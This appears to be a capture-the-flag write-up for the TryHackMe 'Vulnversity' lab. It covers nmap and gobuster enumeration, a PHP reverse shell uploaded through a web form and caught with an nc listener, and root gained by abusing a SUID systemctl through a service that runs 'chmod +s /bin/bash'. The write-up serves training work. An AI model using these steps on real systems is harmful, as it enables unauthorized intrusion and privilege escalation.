### VULNVERSITY

# Platform : TryHackMe

# Disclaimer

This CTF is very detailed, so sometimes I won't explain everything when the lab does it correctly.

# Write up

I started this CTF challenge as usual, with nmap enumeration

```bash
└─$ nmap -sV 10.130.128.134
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-12 06:34 -0800
Nmap scan report for 10.130.128.134
Host is up (0.023s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
3128/tcp open  http-proxy  Squid http proxy 4.10
3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.65 seconds
```

I continued with a gobuster enumeration against the HTTP exposed service on port 3333. 

```bash
└─$ gobuster dir -u http://10.130.128.134:3333 -w /usr/share/wordlists/dirb/common.txt -x txt,php,xml
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.130.128.134:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,php,xml
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta.php             (Status: 403) [Size: 281]
.htaccess            (Status: 403) [Size: 281]
.hta.txt             (Status: 403) [Size: 281]
.hta.xml             (Status: 403) [Size: 281]
.hta                 (Status: 403) [Size: 281]
.htpasswd            (Status: 403) [Size: 281]
.htpasswd.txt        (Status: 403) [Size: 281]
.htaccess.php        (Status: 403) [Size: 281]
.htpasswd.php        (Status: 403) [Size: 281]
.htaccess.xml        (Status: 403) [Size: 281]
.htaccess.txt        (Status: 403) [Size: 281]
.htpasswd.xml        (Status: 403) [Size: 281]
css                  (Status: 301) [Size: 321] [--> http://10.130.128.134:3333/css/]
fonts                (Status: 301) [Size: 323] [--> http://10.130.128.134:3333/fonts/]
images               (Status: 301) [Size: 324] [--> http://10.130.128.134:3333/images/]
index.html           (Status: 200) [Size: 33014]
internal             (Status: 301) [Size: 326] [--> http://10.130.128.134:3333/internal/]
js                   (Status: 301) [Size: 320] [--> http://10.130.128.134:3333/js/]
server-status        (Status: 403) [Size: 281]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```

There's only a few URL that are accessible and the one that caught my attention was internal directory. At this URL I found an uplaod form page. Using Burp Suite and as explained, we can upload a .phtml reverse shell. At the same time, we launch a listener on our device.

Note : The CTF gives us were to look for in order to launch the reverse shell "http://MACHINE_IP:3333/internal/uploads/php-reverse-shell.phtml". Except they could have not give it to us. After uploading the script, we can use gobuster in order to retrieve some directories, on the /internal URL. We discover the /upload endpoint, that enables to launch the shell.

```bash
└─$ gobuster dir -u http://10.130.128.134:3333/internal -w /usr/share/wordlists/dirb/common.txt -x txt,php,xml
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.130.128.134:3333/internal
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,php,xml
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta.php             (Status: 403) [Size: 281]
.hta                 (Status: 403) [Size: 281]
.hta.xml             (Status: 403) [Size: 281]
.htaccess.php        (Status: 403) [Size: 281]
.hta.txt             (Status: 403) [Size: 281]
.htaccess            (Status: 403) [Size: 281]
.htaccess.xml        (Status: 403) [Size: 281]
.htaccess.txt        (Status: 403) [Size: 281]
.htpasswd.php        (Status: 403) [Size: 281]
.htpasswd            (Status: 403) [Size: 281]
.htpasswd.xml        (Status: 403) [Size: 281]
.htpasswd.txt        (Status: 403) [Size: 281]
css                  (Status: 301) [Size: 330] [--> http://10.130.128.134:3333/internal/css/]
index.php            (Status: 200) [Size: 525]
index.php            (Status: 200) [Size: 525]
uploads              (Status: 301) [Size: 334] [--> http://10.130.128.134:3333/internal/uploads/]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```

We now have a shell and can answer the different questions 

```bash
└─$ nc -lvnp 1234              
Listening on 0.0.0.0 1234
Connection received on 10.130.128.134 35954
Linux ip-10-130-128-134 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 09:42:43 up 12 min,  0 users,  load average: 0.12, 0.15, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ cd ./home
$ ls -la
total 16
drwxr-xr-x  4 root   root   4096 Jun 12  2025 .
drwxr-xr-x 23 root   root   4096 Nov 12 09:30 ..
drwxr-xr-x  2 bill   bill   4096 Jul 31  2019 bill
drwxr-xr-x  4 ubuntu ubuntu 4096 Jun 12  2025 ubuntu
$ cd ./bill
$ ls -la
total 24
drwxr-xr-x 2 bill bill 4096 Jul 31  2019 .
drwxr-xr-x 4 root root 4096 Jun 12  2025 ..
-rw-r--r-- 1 bill bill  220 Jul 31  2019 .bash_logout
-rw-r--r-- 1 bill bill 3771 Jul 31  2019 .bashrc
-rw-r--r-- 1 bill bill  655 Jul 31  2019 .profile
-rw-r--r-- 1 bill bill   33 Jul 31  2019 user.txt
$ cat user.txt 
[REDACTED]
```

We then want to privilege escalate. 

```bash
$ find / -type f -perm -4000 2> /dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/mount
/bin/umount
/bin/systemctl
/bin/fusermount
/snap/snapd/24505/usr/lib/snapd/snap-confine
/snap/core20/2582/usr/bin/chfn
/snap/core20/2582/usr/bin/chsh
/snap/core20/2582/usr/bin/gpasswd
/snap/core20/2582/usr/bin/mount
/snap/core20/2582/usr/bin/newgrp
/snap/core20/2582/usr/bin/passwd
/snap/core20/2582/usr/bin/su
/snap/core20/2582/usr/bin/sudo
/snap/core20/2582/usr/bin/umount
/snap/core20/2582/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2582/usr/lib/openssh/ssh-keysign
/sbin/mount.cifs
```

The one binary with unnecessary SUID permissions is systemctl. Looking at gtfobins.org web site, we can abuse this misconception with the given script :

```bash
echo '[Service]
Type=oneshot
ExecStart=/path/to/command
[Install]
WantedBy=multi-user.target' >/path/to/temp-file.service
```

I edited the first template to create my own service newService.service located in the /tmp directory. When, we will launch this service with systemctl, it will give SUID permissions to the bash binary. We launch the new service :

```bash
$ cat /tmp/newService.service
[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]                                
WantedBy=multi-user.target
$ systemctl link /tmp/newService.service
$ systemctl enable --now /tmp/newService.service
Created symlink /etc/systemd/system/multi-user.target.wants/newService.service -> /tmp/newService.service.
```

I checked if the /bin/bash file had been given the SUID permissions and it did. I then looked how to exploit overly permissive bash permissions on GTFOBins website.

```bash
$ bash -p
whoami
root
cd /root
cat root.txt
[REDACTED]
```

# Key takeaway

Cybersecurity isn't about copy and paste. You must understand every command you use and question how to discover every advice you'd been given. 
